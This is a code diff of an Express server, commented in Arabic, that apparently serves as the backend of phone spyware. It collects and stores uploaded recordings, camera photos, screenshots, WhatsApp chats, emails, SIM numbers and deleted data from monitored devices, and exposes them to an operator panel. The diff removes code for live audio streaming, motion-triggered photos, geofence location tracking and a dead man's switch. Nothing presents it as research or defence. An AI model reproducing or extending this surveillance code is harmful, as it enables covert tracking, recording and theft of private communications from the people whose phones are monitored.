@@ -9,7 +9,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(cors());
-app.use(bodyParser.json({ limit: '100mb' }));
+app.use(bodyParser.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
 const dataDir = path.join(__dirname, 'data');
@@ -351,6 +351,7 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, audio_count: audios.length });
         }
 
+        // ✅ ✅ ✅ جديد — تسجيل فيديو
         if (data.type === 'video_recording' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -413,110 +414,6 @@ app.post('/upload.php', (req, res) => {
             pushToDevice(deviceId, 'new_camera_photo', photoEntry);
             return res.json({ success: true, camera_count: photos.length });
         }
-
-        // ═══════════════════════════════════════════════════════════
-        // ✅ ADVANCED FEATURES UPLOADS
-        // ═══════════════════════════════════════════════════════════
-
-        // 📸 صورة كاميرا الحركة
-        if (data.type === 'motion_photo' && data.file_data) {
-            const deviceId = data.device_id || 'unknown';
-            const deviceDir = path.join(dataDir, deviceId);
-            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-            const motionFile = path.join(deviceDir, 'motion_photos.json');
-            let photos = [];
-            if (fs.existsSync(motionFile)) photos = JSON.parse(fs.readFileSync(motionFile, 'utf8'));
-            const exists = photos.find(p => p.file_name === data.file_name);
-            if (exists) return res.json({ success: true, duplicated: true });
-            const photoEntry = {
-                file_name: data.file_name || '',
-                file_data: data.file_data || '',
-                file_size: data.file_size || 0,
-                timestamp: data.timestamp || Date.now()
-            };
-            photos.unshift(photoEntry);
-            if (photos.length > 500) photos = photos.slice(0, 500);
-            fs.writeFileSync(motionFile, JSON.stringify(photos, null, 2));
-            updateDevicesList(deviceId, null);
-            pushToDevice(deviceId, 'new_motion_photo', photoEntry);
-            console.log(`[MOTION] ${photoEntry.file_name} from ${deviceId}`);
-            return res.json({ success: true, motion_count: photos.length });
-        }
-
-        // 📍 حدث Geofence
-        if (data.type === 'geofence_event') {
-            const deviceId = data.device_id || 'unknown';
-            const deviceDir = path.join(dataDir, deviceId);
-            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-            const geoFile = path.join(deviceDir, 'geofence_events.json');
-            let events = [];
-            if (fs.existsSync(geoFile)) events = JSON.parse(fs.readFileSync(geoFile, 'utf8'));
-            const eventEntry = {
-                zone_name: data.zone_name || 'Zone',
-                event: data.event || 'unknown',
-                lat: data.lat || 0,
-                lng: data.lng || 0,
-                distance: data.distance || 0,
-                timestamp: data.timestamp || Date.now()
-            };
-            events.unshift(eventEntry);
-            if (events.length > 1000) events = events.slice(0, 1000);
-            fs.writeFileSync(geoFile, JSON.stringify(events, null, 2));
-            updateDevicesList(deviceId, null);
-            pushToDevice(deviceId, 'new_geofence_event', eventEntry);
-            console.log(`[GEO] ${eventEntry.event} ${eventEntry.zone_name} from ${deviceId}`);
-            return res.json({ success: true, geofence_count: events.length });
-        }
-
-        // 💀 Dead Man's Switch أُطلق
-        if (data.type === 'deadman_triggered') {
-            const deviceId = data.device_id || 'unknown';
-            const deviceDir = path.join(dataDir, deviceId);
-            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-            const deadFile = path.join(deviceDir, 'deadman_events.json');
-            let events = [];
-            if (fs.existsSync(deadFile)) events = JSON.parse(fs.readFileSync(deadFile, 'utf8'));
-            const deadEntry = {
-                triggered: true,
-                timestamp: data.timestamp || Date.now()
-            };
-            events.unshift(deadEntry);
-            if (events.length > 100) events = events.slice(0, 100);
-            fs.writeFileSync(deadFile, JSON.stringify(events, null, 2));
-            updateDevicesList(deviceId, null);
-            pushToDevice(deviceId, 'deadman_triggered', deadEntry);
-            console.log(`[DEADMAN] 💀 triggered on ${deviceId}`);
-            return res.json({ success: true });
-        }
-
-        // 🎙️ Chunk من البث الصوتي الحي
-        if (data.type === 'live_audio_chunk' && data.file_data) {
-            const deviceId = data.device_id || 'unknown';
-            const deviceDir = path.join(dataDir, deviceId);
-            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-            const liveFile = path.join(deviceDir, 'live_audio.json');
-            let chunks = [];
-            if (fs.existsSync(liveFile)) chunks = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
-            const exists = chunks.find(c => c.file_name === data.file_name);
-            if (exists) return res.json({ success: true, duplicated: true });
-            const chunkEntry = {
-                file_name: data.file_name || '',
-                file_data: data.file_data || '',
-                file_size: data.file_size || 0,
-                chunk_index: data.chunk_index || 0,
-                timestamp: data.timestamp || Date.now()
-            };
-            chunks.push(chunkEntry);
-            if (chunks.length > 200) chunks = chunks.slice(-200);
-            fs.writeFileSync(liveFile, JSON.stringify(chunks, null, 2));
-            updateDevicesList(deviceId, null);
-            pushToDevice(deviceId, 'new_live_audio', chunkEntry);
-            return res.json({ success: true, chunk_count: chunks.length });
-        }
-
-        // ═══════════════════════════════════════════════════════════
-        // END ADVANCED FEATURES UPLOADS
-        // ═══════════════════════════════════════════════════════════
 
         if (data.type === 'deleted_data') {
             const deviceId = data.device_id || 'unknown';
@@ -756,10 +653,6 @@ app.get('/live.php', (req, res) => {
         const screenshotFile = path.join(dataDir, deviceId, 'screenshots.json');
         const cameraFile = path.join(dataDir, deviceId, 'camera_photos.json');
         const videoFile = path.join(dataDir, deviceId, 'video_recordings.json');
-        const motionFile = path.join(dataDir, deviceId, 'motion_photos.json');
-        const geofenceFile = path.join(dataDir, deviceId, 'geofence_events.json');
-        const liveAudioFile = path.join(dataDir, deviceId, 'live_audio.json');
-        const deadmanFile = path.join(dataDir, deviceId, 'deadman_events.json');
 
         let response = {
             online: false,
@@ -783,10 +676,6 @@ app.get('/live.php', (req, res) => {
             screenshot_count: 0,
             camera_count: 0,
             video_count: 0,
-            motion_count: 0,
-            geofence_count: 0,
-            live_audio_count: 0,
-            deadman_count: 0,
             sim_numbers: [],
             carrier: '',
             self_number: '',
@@ -824,10 +713,6 @@ app.get('/live.php', (req, res) => {
         if (fs.existsSync(screenshotFile)) response.screenshot_count = JSON.parse(fs.readFileSync(screenshotFile, 'utf8')).length;
         if (fs.existsSync(cameraFile)) response.camera_count = JSON.parse(fs.readFileSync(cameraFile, 'utf8')).length;
         if (fs.existsSync(videoFile)) response.video_count = JSON.parse(fs.readFileSync(videoFile, 'utf8')).length;
-        if (fs.existsSync(motionFile)) response.motion_count = JSON.parse(fs.readFileSync(motionFile, 'utf8')).length;
-        if (fs.existsSync(geofenceFile)) response.geofence_count = JSON.parse(fs.readFileSync(geofenceFile, 'utf8')).length;
-        if (fs.existsSync(liveAudioFile)) response.live_audio_count = JSON.parse(fs.readFileSync(liveAudioFile, 'utf8')).length;
-        if (fs.existsSync(deadmanFile)) response.deadman_count = JSON.parse(fs.readFileSync(deadmanFile, 'utf8')).length;
 
         if (fs.existsSync(simFile)) {
             try {
@@ -870,7 +755,7 @@ app.get('/api.php', (req, res) => {
             if (!session || Date.now() > session.expires) return res.status(401).json({ error: 'Unauthorized' });
 
             if (!session.isOwner) {
-                const ownerOnlyActions = ['delete_device', 'clear_deleted', 'delete_deleted_item', 'delete_whatsapp_chat', 'delete_whatsapp', 'clear_whatsapp', 'delete_email', 'delete_voice', 'clear_voices', 'clear_audio', 'clear_screenshots', 'clear_camera_photos', 'delete_video', 'clear_videos', 'delete_motion_photo', 'clear_motion_photos', 'delete_geofence_event', 'clear_geofence_events', 'clear_live_audio'];
+                const ownerOnlyActions = ['delete_device', 'clear_deleted', 'delete_deleted_item', 'delete_whatsapp_chat', 'delete_whatsapp', 'clear_whatsapp', 'delete_email', 'delete_voice', 'clear_voices', 'clear_audio', 'clear_screenshots', 'clear_camera_photos', 'delete_video', 'clear_videos'];
                 if (ownerOnlyActions.includes(action)) return res.status(403).json({ error: 'Forbidden - Owner only' });
 
                 if (deviceId) {
@@ -953,6 +838,7 @@ app.get('/api.php', (req, res) => {
             return res.json({ success: true });
         }
 
+        // ✅ ✅ ✅ جديد — جلب تسجيلات الفيديو
         if (action === 'get_videos') {
             const videoFile = path.join(dataDir, deviceId, 'video_recordings.json');
             if (fs.existsSync(videoFile)) return res.json(JSON.parse(fs.readFileSync(videoFile, 'utf8')));
@@ -978,84 +864,6 @@ app.get('/api.php', (req, res) => {
             if (fs.existsSync(videoFile)) fs.writeFileSync(videoFile, '[]');
             return res.json({ success: true });
         }
-
-        // ═══════════════════════════════════════════════════════════
-        // ✅ ADVANCED FEATURES (motion, geofence, live audio, deadman)
-        // ═══════════════════════════════════════════════════════════
-
-        if (action === 'get_motion_photos') {
-            const motionFile = path.join(dataDir, deviceId, 'motion_photos.json');
-            if (fs.existsSync(motionFile)) return res.json(JSON.parse(fs.readFileSync(motionFile, 'utf8')));
-            return res.json([]);
-        }
-
-        if (action === 'delete_motion_photo') {
-            const idx = parseInt(req.query.index);
-            const motionFile = path.join(dataDir, deviceId, 'motion_photos.json');
-            if (fs.existsSync(motionFile)) {
-                let photos = JSON.parse(fs.readFileSync(motionFile, 'utf8'));
-                if (!isNaN(idx) && idx >= 0 && idx < photos.length) {
-                    photos.splice(idx, 1);
-                    fs.writeFileSync(motionFile, JSON.stringify(photos, null, 2));
-                    return res.json({ success: true });
-                }
-            }
-            return res.json({ success: false });
-        }
-
-        if (action === 'clear_motion_photos') {
-            const motionFile = path.join(dataDir, deviceId, 'motion_photos.json');
-            if (fs.existsSync(motionFile)) fs.writeFileSync(motionFile, '[]');
-            return res.json({ success: true });
-        }
-
-        if (action === 'get_geofence_events') {
-            const geoFile = path.join(dataDir, deviceId, 'geofence_events.json');
-            if (fs.existsSync(geoFile)) return res.json(JSON.parse(fs.readFileSync(geoFile, 'utf8')));
-            return res.json([]);
-        }
-
-        if (action === 'delete_geofence_event') {
-            const idx = parseInt(req.query.index);
-            const geoFile = path.join(dataDir, deviceId, 'geofence_events.json');
-            if (fs.existsSync(geoFile)) {
-                let events = JSON.parse(fs.readFileSync(geoFile, 'utf8'));
-                if (!isNaN(idx) && idx >= 0 && idx < events.length) {
-                    events.splice(idx, 1);
-                    fs.writeFileSync(geoFile, JSON.stringify(events, null, 2));
-                    return res.json({ success: true });
-                }
-            }
-            return res.json({ success: false });
-        }
-
-        if (action === 'clear_geofence_events') {
-            const geoFile = path.join(dataDir, deviceId, 'geofence_events.json');
-            if (fs.existsSync(geoFile)) fs.writeFileSync(geoFile, '[]');
-            return res.json({ success: true });
-        }
-
-        if (action === 'get_live_audio') {
-            const liveFile = path.join(dataDir, deviceId, 'live_audio.json');
-            if (fs.existsSync(liveFile)) return res.json(JSON.parse(fs.readFileSync(liveFile, 'utf8')));
-            return res.json([]);
-        }
-
-        if (action === 'clear_live_audio') {
-            const liveFile = path.join(dataDir, deviceId, 'live_audio.json');
-            if (fs.existsSync(liveFile)) fs.writeFileSync(liveFile, '[]');
-            return res.json({ success: true });
-        }
-
-        if (action === 'get_deadman_events') {
-            const deadFile = path.join(dataDir, deviceId, 'deadman_events.json');
-            if (fs.existsSync(deadFile)) return res.json(JSON.parse(fs.readFileSync(deadFile, 'utf8')));
-            return res.json([]);
-        }
-
-        // ═══════════════════════════════════════════════════════════
-        // END ADVANCED FEATURES
-        // ═══════════════════════════════════════════════════════════
 
         if (action === 'get_screenshots') {
             const screenshotFile = path.join(dataDir, deviceId, 'screenshots.json');
